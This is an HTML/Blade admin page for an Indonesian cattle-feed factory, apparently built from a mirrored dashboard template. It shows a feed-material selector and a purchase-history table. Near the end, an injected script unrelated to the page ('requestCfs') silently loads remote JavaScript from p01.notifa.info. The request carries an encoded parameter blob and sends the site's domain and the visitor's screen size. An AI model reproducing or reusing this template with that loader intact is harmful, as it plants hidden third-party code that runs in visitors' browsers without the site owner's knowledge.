<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from wow.designgurus.in/sideNavigationLayout/blue/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Oct 2018 15:42:30 GMT -->
<head>
    <meta charset="UTF-8">
    <meta content="ie=edge" http-equiv="x-ua-compatible">
    <meta content="template language" name="keywords">
    <meta content="Design_Gurus" name="author">
    <meta content="WOW Admin dashboard html template" name="description">
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <title>SAPI-I7</title>

    <!--favicon-->
    <link href="../assetAdmin/assets/images/favicon.ico" rel="shortcut icon">

    <!--Preloader-CSS-->
    <link rel="stylesheet" href="../assetAdmin/assets/plugins/preloader/preloader.css">

    <!--bootstrap-4-->
    <link rel="stylesheet" href="../assetAdmin/assets/css/bootstrap.min.css">

    <!--Custom Scroll-->
    <link rel="stylesheet" href="../assetAdmin/assets/plugins/customScroll/jquery.mCustomScrollbar.min.css">
    <!--Font Icons-->
    <link rel="stylesheet" href="../assetAdmin/assets/icons/simple-line/css/simple-line-icons.css">
    <link rel="stylesheet" href="../assetAdmin/assets/icons/dripicons/dripicons.css">
    <link rel="stylesheet" href="../assetAdmin/assets/icons/ionicons/css/ionicons.min.css">
    <link rel="stylesheet" href="../assetAdmin/assets/icons/eightyshades/eightyshades.css">
    <link rel="stylesheet" href="../assetAdmin/assets/icons/fontawesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="../assetAdmin/assets/icons/foundation/foundation-icons.css">
    <link rel="stylesheet" href="../assetAdmin/assets/icons/metrize/metrize.css">
    <link rel="stylesheet" href="../assetAdmin/assets/icons/typicons/typicons.min.css">
    <link rel="stylesheet" href="../assetAdmin/assets/icons/weathericons/css/weather-icons.min.css">

    <!--Date-range-->
    <link rel="stylesheet" href="../assetAdmin/assets/plugins/date-range/daterangepicker.css">
    <!--Drop-Zone-->
    <link rel="stylesheet" href="../assetAdmin/assets/plugins/dropzone/dropzone.css">
    <!--Full Calendar-->
    <link rel="stylesheet" href="../assetAdmin/assets/plugins/full-calendar/fullcalendar.min.css">
    <!--Normalize Css-->
    <link rel="stylesheet" href="../assetAdmin/assets/css/normalize.css">
    <!--Main Css-->
    <link rel="stylesheet" href="../assetAdmin/assets/css/main.css">
</head>
<body>

{{--<!---Preloader Starts Here--->--}}
{{--<div id="ip-container" class="ip-container">--}}
{{--<header class="ip-header">--}}
{{--<h1 class="ip-logo text-center"><img class="img-fluid" src="assets/images/logo-c.png" alt=""--}}
{{--class="ip-logo text-center"/></h1>--}}
{{--<div class="ip-loader">--}}
{{--<svg class="ip-inner" width="60px" height="60px" viewBox="0 0 80 80">--}}
{{--<path class="ip-loader-circlebg"--}}
{{--d="M40,10C57.351,10,71,23.649,71,40.5S57.351,71,40.5,71 S10,57.351,10,40.5S23.649,10,40.5,10z"/>--}}
{{--<path id="ip-loader-circle" class="ip-loader-circle"--}}
{{--d="M40,10C57.351,10,71,23.649,71,40.5S57.351,71,40.5,71 S10,57.351,10,40.5S23.649,10,40.5,10z"/>--}}
{{--</svg>--}}
{{--</div>--}}
{{--</header>--}}
{{--</div>--}}
<!---Preloader Ends Here--->


<!--Navigation-->
<nav id="navigation" class="navigation-sidebar bg-primary">
    <div class="navigation-header">
        <a href="index.html"><span class="logo">PABRIK PAKAN</span></a>
        <!--<img src="logo.png" alt="logo" class="brand" height="50">-->
    </div>

    <!--Navigation Profile area-->
    <div class="navigation-profile">
        <img class="profile-img rounded-circle" src="../assetAdmin/assets/images/1.jpg" alt="profile image">
        <h4 class="name">Admin Pabrik</h4>
        <span class="designation">SAPI</span>

        <a id="show-user-menu" href="javascript:void(0);" class="circle-white-btn profile-setting"><i
                    class="fa fa-cog"></i></a>

        <!--logged user hover menu-->
        <div class="logged-user-menu bg-white">
            <div class="avatar-info">
                <img class="profile-img rounded-circle" src="../assetAdmin/assets/images/1.jpg" alt="profile image">
                <h4 class="name">Meera</h4>
                <span class="designation">UI/UX EXPERT</span>
            </div>

            <ul class="list-unstyled">
                <li>
                    <a href="javascript:void(0);">
                        <i class="ion-ios-email-outline"></i>
                        <span>Emails</span>
                    </a>
                </li>
                <li>
                    <a href="javascript:void(0);">
                        <i class="ion-ios-person-outline"></i>
                        <span>My Profile</span>
                    </a>
                </li>
                <li>
                    <a href="user_change-password.html">
                        <i class="ion-ios-locked-outline"></i>
                        <span>Change Password</span>
                    </a>
                </li>
                <li>
                    <a href="javascript:void(0);">
                        <i class="ion-log-out"></i>
                        <span>Logout</span>
                    </a>
                </li>
            </ul>
        </div>
    </div>

    <!--Navigation Menu Links-->
    @include('pabrik.include_pabrik')
</nav>

<!--Page Container-->
<section class="page-container">
    <div class="page-content-wrapper">
        <!--Header Fixed-->
        <div class="header fixed-header">
            <div class="container-fluid" style="padding: 10px 25px">
                <div class="row">
                    <div class="col-9 col-md-6 d-lg-none">
                        <a id="toggle-navigation" href="javascript:void(0);" class="icon-btn mr-3"><i
                                    class="fa fa-bars"></i></a>
                        <span class="logo">PABRIK PAKAN</span>
                    </div>
                    <div class="col-lg-8 d-none d-lg-block">
                        <ol class="breadcrumb">
                            <li class="breadcrumb-item"><a href="index.html">Dashboard</a></li>
                        </ol>
                    </div>
                </div>
            </div>
        </div>

        <!--Main Content-->
        <div class="content sm-gutter">
            <div class="container-fluid padding-25 sm-padding-10">
                <div class="block form-block mb-4 counter-bg-img"
                     style="background: url(../assetAdmin/assets/images/pabrik_1.jpg);">
                    <form action="#">
                        <div class="form-row">
                            <div class="form-group col-md-6">
                                <label>Pilih Bahan Baku</label>
                                <select class="form-control" style="background: white!important;" id="nama_bahan_baku"
                                        name="nama_bahan_baku" required>
                                    <option value="gajah" selected>Rumput Gajah</option>
                                    <option value="gajah">Daun Jagung</option>
                                </select>
                            </div>
                        </div>
                        <input class="btn btn-primary" type="submit" value="Tampilkan" required>
                    </form>
                </div>
                <div class="block form-block mb-4">
                    <div class="block-heading">
                        <h5>History Pembelian</h5>
                        <hr>
                        <small class="label-info">Stok saat ini : </small> <b>150Kg</b>
                    </div>
                    <div class="tabel table-responsive">
                        <table id="example2"
                               class="table table-bordered table-striped dataTable example2"
                               role="grid"
                               aria-describedby="example2_info">
                            <thead>
                            <tr>
                                <th rowspan="2" style="text-align: center!important; vertical-align: middle!important;">Nama Bahan Baku</th>
                                <th rowspan="2" style="text-align: center!important; vertical-align: middle!important;">Tanggal Pembelian</th>
                                <th colspan="2" style="text-align: center!important; vertical-align: middle!important;">Stok Lama</th>
                                <th colspan="2" style="text-align: center!important; vertical-align: middle!important;">Stok Baru</th>
                                <th rowspan="2" style="text-align: center!important; vertical-align: middle!important;">Total Stok (Kg)</th>
                                <th rowspan="2" style="text-align: center!important; vertical-align: middle!important;">Rata-Rata Harga (Rp)</th>
                            </tr>
                            <tr>
                                <th style="text-align: center!important; vertical-align: middle!important;">Stok Tersedia (Kg)</th>
                                <th style="text-align: center!important; vertical-align: middle!important;">Harga (Rp)</th>
                                <th style="text-align: center!important; vertical-align: middle!important;">Beli Baru (Kg)</th>
                                <th style="text-align: center!important; vertical-align: middle!important;">Harga (Rp)</th>
                            </tr>
                            </thead>
                            <tbody>
                            <tr>
                                <td style="vertical-align: middle!important;">Rumput Gajah</td>
                                <td style="vertical-align: middle!important;">23 November 2018</td>
                                <td style="text-align: center!important; vertical-align: middle!important;">50</td>
                                <td style="text-align: center!important; vertical-align: middle!important;">150.000</td>
                                <td style="text-align: center!important; vertical-align: middle!important;">30</td>
                                <td style="text-align: center!important; vertical-align: middle!important;">90.000</td>
                                <td style="text-align: center!important; vertical-align: middle!important;">80</td>
                                <td style="text-align: center!important; vertical-align: middle!important;">120.000</td>
                            </tr>
                            <tr>
                                <td style="vertical-align: middle!important;">Rumput Gajah</td>
                                <td style="vertical-align: middle!important;">25 November 2018</td>
                                <td style="text-align: center!important; vertical-align: middle!important;">60</td>
                                <td style="text-align: center!important; vertical-align: middle!important;">120.000</td>
                                <td style="text-align: center!important; vertical-align: middle!important;">50</td>
                                <td style="text-align: center!important; vertical-align: middle!important;">150.000</td>
                                <td style="text-align: center!important; vertical-align: middle!important;">110</td>
                                <td style="text-align: center!important; vertical-align: middle!important;">135.000</td>
                            </tr>
                            <tr>
                                <td style="vertical-align: middle!important;">Rumput Gajah</td>
                                <td style="vertical-align: middle!important;">30 November 2018</td>
                                <td style="text-align: center!important; vertical-align: middle!important;">100</td>
                                <td style="text-align: center!important; vertical-align: middle!important;">135.000</td>
                                <td style="text-align: center!important; vertical-align: middle!important;">50</td>
                                <td style="text-align: center!important; vertical-align: middle!important;">150.000</td>
                                <td style="text-align: center!important; vertical-align: middle!important;">150</td>
                                <td style="text-align: center!important; vertical-align: middle!important;">142.500</td>
                            </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>


<!--Jquery-->
<script type="text/javascript" src="../assetAdmin/assets/js/jquery-3.2.1.min.js"></script>
<!--Bootstrap Js-->
<script type="text/javascript" src="../assetAdmin/assets/js/popper.min.js"></script>
<script type="text/javascript" src="../assetAdmin/assets/js/bootstrap.min.js"></script>
<!--Modernizr Js-->
<script type="text/javascript" src="../assetAdmin/assets/js/modernizr.custom.js"></script>

<!--Morphin Search JS-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/morphin-search/classie.js"></script>
<script type="text/javascript" src="../assetAdmin/assets/plugins/morphin-search/morphin-search.js"></script>
<!--Morphin Search JS-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/preloader/pathLoader.js"></script>
<script type="text/javascript" src="../assetAdmin/assets/plugins/preloader/preloader-main.js"></script>

<!--Chart js-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/charts/Chart.min.js"></script>

<!--Sparkline Chart Js-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/sparkline/jquery.sparkline.min.js"></script>
<script type="text/javascript" src="../assetAdmin/assets/plugins/sparkline/jquery.charts-sparkline.js"></script>

<!--Custom Scroll-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/customScroll/jquery.mCustomScrollbar.min.js"></script>
<!--Sortable Js-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/sortable2/sortable.min.js"></script>
<!--DropZone Js-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/dropzone/dropzone.js"></script>
<!--Date Range JS-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/date-range/moment.min.js"></script>
<script type="text/javascript" src="../assetAdmin/assets/plugins/date-range/daterangepicker.js"></script>
<!--CK Editor JS-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/ckEditor/ckeditor.js"></script>
<!--Data-Table JS-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/data-tables/datatables.min.js"></script>
<!--Editable JS-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/editable/editable.js"></script>
<!--Full Calendar JS-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/full-calendar/fullcalendar.min.js"></script>

<!--- Main JS -->
<script src="../assetAdmin/assets/js/main.js"></script>

<script type="text/javascript">if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdoP1qamj8Iz7H3xYZ27zj%2blzVQVx9ZbzdwyR2jY9nYkUWGU2eG9c%2fQpMMGXgVSSgUXwSPW3QUyx9nutG2raeXfO8RJL1o1DUMqGvHzpXP8r2TCI7fL%2bd6x2nOeX%2fgOUJmFo8i3jN9eAb7ceklO5IPQwvMUqTY%2fc7zDZjU1jrRncakGV0fTJ63gWahxbeMZ461MbIfhnVLJSpE1u%2bj%2fmjD1HoutYet5x0zLeTMlCSqHrVVG7lCokFd9bJcIii7H1AeIcCrs2KzdUMk0F79BYe6%2ffH8vXkI7kGvjimCZ36o4M3%2fqcdz4oiP3oPaLx2AFXzzSOZnkHulYb4A05k200m13GVfDWa3oJVE108ZWoeLXU%2bdYIt3sORFDhJXWqOvex4dS%2bclBxuYGauZJtcQC1BDs%2f%2bxXhj4fH0ydFupxg3nUsI2CFGC2XHEisct9DFbmfOZjZowfYhxXSAzIiASXPXEAWAgrJRYQPa%2frPYVHD%2bDjkYJkGMU4hxrT1zP6HU3%2boe%2ffpuJEP2CmgI%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    }
    ;

    $('#example2').DataTable({
        'paging': true,
        'lengthChange': false,
        'searching': false,
        'ordering': false,
        'info': false,
        'autoWidth': false,
        'pageLength': 10,
        "dom": '<"pull-left"f>t<"pull-right"p>',
        "oLanguage": {
            "sSearch": "Cari : "
        }
    });

</script>
</body>

<!-- Mirrored from wow.designgurus.in/sideNavigationLayout/blue/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Oct 2018 15:44:19 GMT -->
</html>